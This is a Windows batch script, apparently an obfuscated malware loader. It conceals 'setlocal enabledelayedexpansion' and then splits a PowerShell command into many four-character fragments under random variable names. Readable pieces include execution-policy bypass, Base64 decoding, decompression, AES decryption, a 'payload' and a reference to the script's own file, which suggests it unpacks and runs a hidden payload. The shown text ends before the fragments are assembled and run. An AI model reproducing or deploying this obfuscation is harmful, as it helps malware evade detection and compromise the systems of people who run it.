@echo off
%CQDFprvFdHIDXMfrcguu%s%CQDFprvFdHIDXMfrcguu%e%CQDFprvFdHIDXMfrcguu%t%CQDFprvFdHIDXMfrcguu%l%CQDFprvFdHIDXMfrcguu%o%CQDFprvFdHIDXMfrcguu%c%CQDFprvFdHIDXMfrcguu%a%CQDFprvFdHIDXMfrcguu%l%CQDFprvFdHIDXMfrcguu% %CQDFprvFdHIDXMfrcguu%e%CQDFprvFdHIDXMfrcguu%n%CQDFprvFdHIDXMfrcguu%a%CQDFprvFdHIDXMfrcguu%b%CQDFprvFdHIDXMfrcguu%l%CQDFprvFdHIDXMfrcguu%e%CQDFprvFdHIDXMfrcguu%d%CQDFprvFdHIDXMfrcguu%e%CQDFprvFdHIDXMfrcguu%l%CQDFprvFdHIDXMfrcguu%a%CQDFprvFdHIDXMfrcguu%y%CQDFprvFdHIDXMfrcguu%e%CQDFprvFdHIDXMfrcguu%d%CQDFprvFdHIDXMfrcguu%e%CQDFprvFdHIDXMfrcguu%x%CQDFprvFdHIDXMfrcguu%p%CQDFprvFdHIDXMfrcguu%a%CQDFprvFdHIDXMfrcguu%n%CQDFprvFdHIDXMfrcguu%s%CQDFprvFdHIDXMfrcguu%i%CQDFprvFdHIDXMfrcguu%o%CQDFprvFdHIDXMfrcguu%n%CQDFprvFdHIDXMfrcguu%
set "yiZuHtcHEouzDhXCbIxP=s"
set "XggSanvqYWJoqrJqFLbT=t"
set "kVawqRDhXyNhCmSBuQkj=!yiZuHtcHEouzDhXCbIxP!e!XggSanvqYWJoqrJqFLbT!"
!kVawqRDhXyNhCmSBuQkj! "nrPVLbKIrO=ar=d"
!kVawqRDhXyNhCmSBuQkj! "RQnqnfqEmr=le -"
!kVawqRDhXyNhCmSBuQkj! "knDoEEyTFP=ram_"
!kVawqRDhXyNhCmSBuQkj! "SaJNoigInX=tS46"
!kVawqRDhXyNhCmSBuQkj! "aQqLYSiiLy=var)"
!kVawqRDhXyNhCmSBuQkj! "qaJjrtuedR=th('"
!kVawqRDhXyNhCmSBuQkj! "OWHrevAkHO=nirt"
!kVawqRDhXyNhCmSBuQkj! "sPBBsEkafn=ypas"
!kVawqRDhXyNhCmSBuQkj! "ToadlNPHfi=] -j"
!kVawqRDhXyNhCmSBuQkj! "ZhBshZiGnX=]::C"
!kVawqRDhXyNhCmSBuQkj! "NlTGKaGjbO=ram2"
!kVawqRDhXyNhCmSBuQkj! "xTCykePxgc=ssio"
!kVawqRDhXyNhCmSBuQkj! "zkWxkVjtSO=aram"
!kVawqRDhXyNhCmSBuQkj! "DeIHXBMjYF=togr"
!kVawqRDhXyNhCmSBuQkj! "okvbcwiVCk=ach "
!kVawqRDhXyNhCmSBuQkj! "GycTMEapEA=onve"
!kVawqRDhXyNhCmSBuQkj! "MlrpucxaMh=aylo"
!kVawqRDhXyNhCmSBuQkj! "uhDcemuqNV=g[]]"
!kVawqRDhXyNhCmSBuQkj! "ytsyriYalI=ds_v"
!kVawqRDhXyNhCmSBuQkj! "LdjSVeiVcw=S46e"
!kVawqRDhXyNhCmSBuQkj! "ijhwLsXtzX=owst"
!kVawqRDhXyNhCmSBuQkj! "gAqUNhsiaa=;	$z"
!kVawqRDhXyNhCmSBuQkj! "LgpjppfPOd=r_va"
!kVawqRDhXyNhCmSBuQkj! "rEjckdqMQk=exec"
!kVawqRDhXyNhCmSBuQkj! "BzpdtChgqo=aylo"
!kVawqRDhXyNhCmSBuQkj! "HbSZfgAwGM=func"
!kVawqRDhXyNhCmSBuQkj! "mYZWrRxmxA=mpre"
!kVawqRDhXyNhCmSBuQkj! "TVXJqwUUaa=ypto"
!kVawqRDhXyNhCmSBuQkj! "MNcIuIFAxq=3PYw"
!kVawqRDhXyNhCmSBuQkj! "oZBcXBtkoa=RfQI"
!kVawqRDhXyNhCmSBuQkj! "mXIOydHxaL=_var"
!kVawqRDhXyNhCmSBuQkj! "GQnisfoJaQ=ZCR."
!kVawqRDhXyNhCmSBuQkj! "XdXvAJBeFz=	$Jl"
!kVawqRDhXyNhCmSBuQkj! "MFNFytftRu=.ToA"
!kVawqRDhXyNhCmSBuQkj! "XabZsUaQFO=de=["
!kVawqRDhXyNhCmSBuQkj! "chnHVIdqjy=_fun"
!kVawqRDhXyNhCmSBuQkj! "vpzBIdwkBz=m.IO"
!kVawqRDhXyNhCmSBuQkj! "LQlllSpiqd=n($p"
!kVawqRDhXyNhCmSBuQkj! "kLztYjSlEq=tsWi"
!kVawqRDhXyNhCmSBuQkj! "ovDqcVAKbV=pres"
!kVawqRDhXyNhCmSBuQkj! "MtSdJOnKWa=rn_v"
!kVawqRDhXyNhCmSBuQkj! "fSdZOANLwt=func"
!kVawqRDhXyNhCmSBuQkj! "LqcDkBIsAI='%~f0'"
!kVawqRDhXyNhCmSBuQkj! "dxWRyXOqZQ=unct"
!kVawqRDhXyNhCmSBuQkj! "nCwcopzSJX=tion"
!kVawqRDhXyNhCmSBuQkj! "dTEjNISORa=var."
!kVawqRDhXyNhCmSBuQkj! "SJnNkmHMXE=esaB"
!kVawqRDhXyNhCmSBuQkj! "rAQCpcsOmC=('ol"
!kVawqRDhXyNhCmSBuQkj! "SBnKlJbWNR=ess_"
